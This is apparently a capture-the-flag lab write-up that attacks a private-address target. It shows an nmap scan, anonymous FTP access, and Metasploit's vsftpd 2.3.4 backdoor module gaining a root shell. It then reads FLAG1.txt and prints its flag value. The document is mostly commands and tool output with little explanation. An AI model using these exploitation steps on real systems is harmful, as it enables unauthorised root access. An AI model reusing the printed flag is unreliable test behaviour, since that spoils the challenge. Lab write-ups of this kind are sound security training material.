# Title :


## Target ip 10.150.150.12


## Enumeration


###  Port scaning 

```sh


$ nmap -sV  10.150.150.12 -A 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-14 16:10 WAT
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
Parallel DNS resolution of 1 host. Timing: About 0.00% done
Stats: 0:00:03 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
Parallel DNS resolution of 1 host. Timing: About 0.00% done
Stats: 0:00:27 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 51.32% done; ETC: 16:11 (0:00:22 remaining)
Stats: 0:00:27 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 51.54% done; ETC: 16:11 (0:00:22 remaining)
Nmap scan report for 10.150.150.12
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.66.67.86
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 1f:bc:e3:e3:5b:eb:ff:b2:30:a7:4c:33:11:bf:67:a3 (RSA)
|   256 c8:e4:18:29:59:d0:4e:ea:dc:05:50:bc:d5:6f:e5:00 (ECDSA)
|_  256 58:d5:70:6d:0d:80:71:0a:ba:8e:1c:7a:c7:37:2f:e2 (ED25519)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 23/tcp)
HOP RTT       ADDRESS
1   148.48 ms 10.66.66.1
2   148.62 ms 10.150.150.12

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.29 seconds
                                                             
                                                           
```

- the ftp allow Anonymous login

```sh

$ ftp 10.150.150.12
Connected to 10.150.150.12.
220 Through the portal... - into nothingness or bliss?
Name (10.150.150.12:blur): Anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
        
```

- exploit using msfconsole 


```sh 

$ msfconsole -q

msf> use /payloads/linux/x86/meterpreter/reverse_tcp


msf payload(linux/x86/meterpreter/reverse_tcp) > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoor

msf payload(linux/x86/meterpreter/reverse_tcp) > use 1
[*] Using configured payload cmd/unix/interact
msf exploit(unix/ftp/vsftpd_234_backdoor) > set payload/linux/x86/meterpreter/reverse_tcp
[-] Unknown datastore option: payload/linux/x86/meterpreter/reverse_tcp.
Usage: set [options] [name] [value]

Set the given option to value.  If value is omitted, print the current value.
If both are omitted, print options that are currently set.

If run from a module context, this will set the value in the module's
datastore.  Use -g to operate on the global datastore.

If setting a PAYLOAD, this command can take an index from `show payloads'.

OPTIONS:

    -c, --clear   Clear the values, explicitly setting to nil (default)
    -g, --global  Operate on global datastore variables
    -h, --help    Help banner.

msf exploit(unix/ftp/vsftpd_234_backdoor) > options 

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  10.150.150.12    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT   21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf exploit(unix/ftp/vsftpd_234_backdoor) > indo -d
[-] Unknown command: indo. Did you mean info? Run the help command for more details.
msf exploit(unix/ftp/vsftpd_234_backdoor) > info -d
[*] Generating documentation for vsftpd_234_backdoor, then opening /home/graceman/snap/metasploit-framework/common/vsftpd_234_backdoor_doc20250826-65685-vumg4a.html in a browser...
msf exploit(unix/ftp/vsftpd_234_backdoor) > user-open error: request declined by the user (code 1)

msf exploit(unix/ftp/vsftpd_234_backdoor) > run
[*] 10.150.150.12:21 - The port used by the backdoor bind listener is already open
[+] 10.150.150.12:21 - UID: uid=0(root) gid=0(root) groups=0(root)
[*] Found shell.
l[*] Command shell session 1 opened (10.66.67.86:40599 -> 10.150.150.12:6200) at 2025-08-26 14:42:48 +0100

ls
sh: 6: lls: not found
shell
[*] Trying to find binary 'python' on the target machine
[-] python not found
[*] Trying to find binary 'python3' on the target machine
[*] Found python3 at /usr/bin/python3
[*] Using `python` to pop up an interactive shell
[*] Trying to find binary 'bash' on the target machine
[*] Found bash at /usr/bin/bash
ls
ls
FLAG1.txt  snap
root@portal:~# ls
ls
FLAG1.txt  snap
root@portal:~# cat FLAG1.txt
cat FLAG1.txt
5ee499eb5d0b8e4269b13483e57adaa0b3815f48
root@portal:~# 

```
